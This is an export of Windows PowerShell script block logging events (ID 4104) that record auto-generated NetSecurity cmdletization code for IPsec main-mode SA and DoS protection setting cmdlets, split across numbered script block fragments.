            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeSA.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetIPsecMainModeSA' -Alias '*'
        


ScriptBlock ID: c9849d56-067b-46e5-8982-10e5c80c041b
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetIPsecIdentity'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                


ScriptBlock ID: e0aa54cd-6705-40f6-bb1c-0f84b016e1ba
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (6 of 6):
String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecDospSetting.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetIPsecDospSetting' -Alias '*'
        

function Remove-NetIPsecDospSetting
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIPsecDoSPSetting')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIPsecDoSPSetting')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('ElementName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecDospSetting.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetIPsecDospSetting' -Alias '*'
        


ScriptBlock ID: 641bc2d7-07d8-4b2d-b3f4-ec7978cbe7dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (5 of 6):
BytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IpV6FilterExemptDscp')) {
            [object]$__cmdletization_value = ${IpV6FilterExemptDscp}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6FilterExemptDscp'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6FilterExemptDscp'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IpV6FilterExemptRateLimitBytesPerSec')) {
            [object]$__cmdletization_value = ${IpV6FilterExemptRateLimitBytesPerSec}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6FilterExemptRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6FilterExemptRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('DefBlockExemptDscp')) {
            [object]$__cmdletization_value = ${DefBlockExemptDscp}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefBlockExemptDscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefBlockExemptDscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('DefBlockExemptRateLimitBytesPerSec')) {
            [object]$__cmdletization_value = ${DefBlockExemptRateLimitBytesPerSec}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefBlockExemptRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefBlockExemptRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('MaxStateEntries')) {
            [object]$__cmdletization_value = ${MaxStateEntries}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxStateEntries'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxStateEntries'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('MaxPerIPRateLimitQueues')) {
            [object]$__cmdletization_value = ${MaxPerIPRateLimitQueues}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxPerIPRateLimitQueues'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxPerIPRateLimitQueues'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('EnabledKeyingModules')) {
            [object]$__cmdletization_value = ${EnabledKeyingModules}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnabledKeyingModules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DospKeyModules'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnabledKeyingModules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DospKeyModules'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('FilteringFlags')) {
            [object]$__cmdletization_value = ${FilteringFlags}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'FilteringFlags'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DospFlags'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'FilteringFlags'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DospFlags'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('PublicInterfaceAliases')) {
            [object]$__cmdletization_value = ${PublicInterfaceAliases}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PublicInterfaceAliases'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PublicInterfaceAliases'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('PrivateInterfaceAliases')) {
            [object]$__cmdletization_value = ${PrivateInterfaceAliases}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PrivateInterfaceAliases'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PrivateInterfaceAliases'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('PublicV6Address')) {
            [object]$__cmdletization_value = ${PublicV6Address}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PublicV6Address'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PublicV6Address'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('PrivateV6Address')) {
            [object]$__cmdletization_value = ${PrivateV6Address}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PrivateV6Address'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PrivateV6Address'; ParameterType = 'System.

ScriptBlock ID: 641bc2d7-07d8-4b2d-b3f4-ec7978cbe7dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (4 of 6):
ospFlags]
    ${FilteringFlags},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [WildcardPattern[]]
    ${PublicInterfaceAliases},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [WildcardPattern[]]
    ${PrivateInterfaceAliases},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${PublicV6Address},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${PrivateV6Address},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('ElementName', $__cmdletization_values, $true, 'Default')
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('StateIdleTimeoutSeconds')) {
            [object]$__cmdletization_value = ${StateIdleTimeoutSeconds}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'StateIdleTimeoutSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'StateIdleTimeoutSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('PerIPRateLimitQueueIdleTimeoutSeconds')) {
            [object]$__cmdletization_value = ${PerIPRateLimitQueueIdleTimeoutSeconds}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerIPRateLimitQueueIdleTimeoutSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerIPRateLimitQueueIdleTimeoutSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IpV6IPsecUnauthDscp')) {
            [object]$__cmdletization_value = ${IpV6IPsecUnauthDscp}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthDscp'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthDscp'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IpV6IPsecUnauthRateLimitBytesPerSec')) {
            [object]$__cmdletization_value = ${IpV6IPsecUnauthRateLimitBytesPerSec}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IpV6IPsecUnauthPerIPRateLimitBytesPerSec')) {
            [object]$__cmdletization_value = ${IpV6IPsecUnauthPerIPRateLimitBytesPerSec}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthPerIPRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthPerIPRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IpV6IPsecAuthDscp')) {
            [object]$__cmdletization_value = ${IpV6IPsecAuthDscp}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecAuthDscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecAuthDscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IpV6IPsecAuthRateLimitBytesPerSec')) {
            [object]$__cmdletization_value = ${IpV6IPsecAuthRateLimitBytesPerSec}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecAuthRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecAuthRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IcmpV6Dscp')) {
            [object]$__cmdletization_value = ${IcmpV6Dscp}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IcmpV6Dscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IcmpV6Dscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IcmpV6RateLimitBytesPerSec')) {
            [object]$__cmdletization_value = ${IcmpV6RateLimitBytesPerSec}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IcmpV6RateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IcmpV6RateLimit

ScriptBlock ID: 641bc2d7-07d8-4b2d-b3f4-ec7978cbe7dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (3 of 6):
ases}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PublicInterfaceAliases'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PublicInterfaceAliases'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PrivateInterfaceAliases')) {
          [object]$__cmdletization_value = ${PrivateInterfaceAliases}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PrivateInterfaceAliases'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
